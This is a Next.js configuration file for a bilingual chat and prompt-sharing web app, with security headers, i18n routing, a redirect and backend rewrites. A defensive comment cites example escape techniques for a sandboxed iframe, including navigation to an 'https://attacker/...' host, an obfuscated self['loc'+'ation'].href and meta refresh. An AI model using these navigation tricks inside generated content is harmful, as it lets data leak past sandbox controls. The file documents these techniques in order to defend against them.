// Next.js の設定。セキュリティ用の HTTP ヘッダー、画像最適化の許可パス、日本語/英語の i18n ルーティング、旧 URL の転送、
// そしてバックエンドの各 API へ転送する rewrites を定義する。
// Next.js configuration: security HTTP headers, image optimization paths, Japanese/English i18n routing, a legacy URL redirect,
// and the rewrites that forward requests to the backend APIs.

// 転送先のバックエンドの URL。環境変数 BACKEND_URL で指定し、未設定ならローカルの 5004 番ポートを使う。
// Backend URL that requests are forwarded to; set through BACKEND_URL, defaulting to local port 5004.
const backendUrl = process.env.BACKEND_URL || "http://localhost:5004";
// frame-src 'self' が、生成 UI のサンドボックス iframe が自分で外部オリジンへ遷移することに対する実質的な防御線になっている。
// 遷移の例は、`location.href = "https://attacker/..."`、meta refresh、204 やダウンロードを返すエンドポイントへの繰り返しの遷移。
// iframe 自身の sandbox や CSP ではこれを止められない。sandbox="allow-scripts" で allow-top-navigation を付けないのは親ページが
// 引きずられるのを防ぐだけで、iframe 内の meta CSP の connect-src が制御するのは fetch/XHR であり、遷移ではない。
// frame-src は、遷移のリクエストが送られる前に Chromium が検査する。このアプリが生成する srcdoc（frontend/components/chat_page/
// sandbox_artifact_frame.tsx）そのものを使って実際の Chromium で確認した。Artifact 内の同期的な `self["loc"+"ation"].href = ...`、
// meta refresh、204 を返すエンドポイントへの 3 回の繰り返し遷移はいずれもブロックされ、外部へのリクエストは 1 件も出なかった。
// 最初の about:srcdoc の読み込みと、通常の描画をする Artifact には影響しなかった。frame-src が無いと、同じ同期遷移が毎回攻撃者側へ届いた。
// このアプリの iframe はこのサンドボックスの Artifact だけなので、'self' 以外を許可する必要はない。
// 詳しい経緯は docs/architecture/system_design_deep_dive.md の 9.6 節を参照。
// frame-src 'self' is the real boundary against the generated-UI sandbox iframe navigating
// itself to an external origin (e.g. `location.href = "https://attacker/..."`, a meta-refresh,
// or repeated navigations to a 204/download endpoint). The iframe's own sandbox/CSP cannot stop
// that: sandbox="allow-scripts" without allow-top-navigation only protects the *parent* page from
// being dragged along, and the iframe's meta CSP connect-src governs fetch/XHR, not navigation.
// frame-src is checked by Chromium before the navigation request is ever sent - confirmed against
// real Chromium with the exact srcdoc this app generates (frontend/components/chat_page/
// sandbox_artifact_frame.tsx): a synchronous `self["loc"+"ation"].href = ...` inside the artifact,
// a meta-refresh, and three repeated navigations to a 204 endpoint were all blocked with zero
// outbound requests, while the initial about:srcdoc load (and a normal rendering artifact) were
// unaffected. Without frame-src, the same synchronous navigation reached the attacker every time.
// The only iframe in this app is that sandbox artifact, so 'self' never needs to permit anything
// else; see docs/architecture/system_design_deep_dive.md section 9.6 for the full writeup.
// 全ページに付けるセキュリティヘッダー。他サイトへの埋め込み（フレーム化）の禁止、MIME の推測の無効化、リファラーの制限など。
// Security headers added to every page: no framing by other sites, MIME sniffing disabled, restricted referrer, and so on.
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: "frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; frame-src 'self'"
  },
  {
    key: "X-Frame-Options",
    value: "DENY"
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff"
  },
  {
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin"
  }
];

/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  transpilePackages: ["marked"],
  images: {
    // プロンプト共有の画像はバックエンドへの rewrite 経由で配信され、ブラウザへ届く前に Next.js/sharp で最適化できる。
    // Prompt-share images are served through the backend rewrite and can be
    // optimized by Next.js/sharp before reaching the browser.
    localPatterns: [
      { pathname: "/prompt_share/api/media/**" },
      { pathname: "/static/uploads/prompt_share/**" }
    ]
  },
  // 日本語は従来URL、英語は /en 配下の独立URLとして公開する。
  // Keep Japanese on the existing URLs and publish English under /en.
  i18n: {
    locales: ["ja", "en"],
    defaultLocale: "ja",
    localeDetection: false
  },
  // 投稿したプロンプトの管理は設定画面に一本化したため、旧 URL は設定の該当セクションへ恒久転送する（i18n で /en 配下にも効く）。
  // Managing posted prompts now lives only in settings; the legacy URL forwards there (i18n also covers /en).
  async redirects() {
    return [
      { source: "/prompt_share/manage_prompts", destination: "/settings?section=prompts", permanent: true }
    ];
  },
  // securityHeaders をすべてのパスに適用する。
  // Applies securityHeaders to every path.
  async headers() {
    return [
      {
        source: "/:path*",
        headers: securityHeaders
      }
    ];
  },
  // ブラウザからの API・認証関連のパスを、同一オリジンのままバックエンドへ転送する。
  // Forwards API and auth-related paths from the browser to the backend while keeping the same origin.
  async rewrites() {
    return [
      { source: "/api/:path*", destination: `${backendUrl}/api/:path*` },
      { source: "/prompt_share/api/:path*", destination: `${backendUrl}/prompt_share/api/:path*` },
      { source: "/prompt_manage/api/:path*", destination: `${backendUrl}/prompt_manage/api/:path*` },
      { source: "/search/:path*", destination: `${backendUrl}/search/:path*` },
      { source: "/memo/api/:path*", destination: `${backendUrl}/memo/api/:path*` },
      { source: "/admin/api/:path*", destination: `${backendUrl}/admin/api/:path*` },
      { source: "/admin/logout", destination: `${backendUrl}/admin/logout` },
      { source: "/google-login", destination: `${backendUrl}/google-login` },
      { source: "/google-callback", destination: `${backendUrl}/google-callback` },
      { source: "/logout", destination: `${backendUrl}/logout` }
    ];
  }
};

export default nextConfig;
